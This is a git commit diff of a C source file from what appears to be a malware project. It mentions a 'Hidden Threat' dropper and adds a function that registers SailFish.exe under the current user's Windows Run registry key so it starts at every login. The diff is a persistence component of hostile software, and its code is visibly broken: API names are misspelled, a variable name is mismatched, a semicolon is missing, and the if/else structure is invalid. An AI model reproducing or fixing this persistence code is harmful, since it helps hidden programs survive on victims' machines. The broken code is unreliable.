c6b298c988ff24bd5ec16b7904457fa9dc8576e9
patato <123103325+hackpatato@users.noreply.github.com>
2026-09-13 19:15:05 +0300

    Add files via upload

--- src/hkcu.c
+++ src/hkcu.c
@@ -3,30 +3,43 @@
 //This needs to be used with the “Hidden Threat” project (or another dropper). Because right now, I don’t want to complicate things further by writing code to determine the file’s location and copy it there.
 //I just realized . It's very likely that the program will call this function over and over again every time it starts, and at some point it will trigger something like a buffer overflow. I need to fix this. 
 int HkcuRegOpenKeyExA() {
+    char appDataPath[MAX_PATH];
+    char finalPath[MAX_PATH];
+    if (GetEnviromentVariable("APPDATA", appDataPath, MAX_PATH) > 0) {
+        return -1;
+    }
+    snprintf(finalPath, sizeof(finalPath), "%s\\Microsoft\\Windows\\Start Menu\\Programs\\SailFish.exe", appDataPath);
+
     HKEY hKEY;
     LONG result = RegOpenKeyExA(
         HKEY_CURRENT_USER,
         "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
         0,
-        KEY_WRITE,
+        KEY_SET_VALUE,
         &hKEY
     );
     if (result == ERROR_SUCCESS) {
-        const char* valueName = "SailAGENT";
-        const char* exePath = "C:\\Users\\Public\\sailfish.exe"; //Yeah, I'll have to fix this one, too.
-        RegSetValueExA(
+        const char* valueName = "SailAgent";
+
+        LONG setRes = regSetValueExA(
             hKEY,
             valueName,
             0,
             REG_SZ,
-            (const BYTE*)exePath,
-            strlen(exePath) + 1
+            (const BYTE*)finalPath,
+            strlen(finalPath) + 1
         );
-        RegCloseKey(hKEY);
-        printf("we made it");
-    } else {
-        printf("we didnt made it %ld\n", result);
-    }
-    return 0;
+        
+        RegCloseKey(hKEY)
+        
+        if (SetRes == ERROR_SUCCESS) {
+            printf("ok");
+        } else {
+            printf("RegSetValueExA %ld\n", setRes);
+
+        } else {
+            printf("RegOpenKeyExA %ld\n", setRes);
+        }
+        return 0;
 
 }
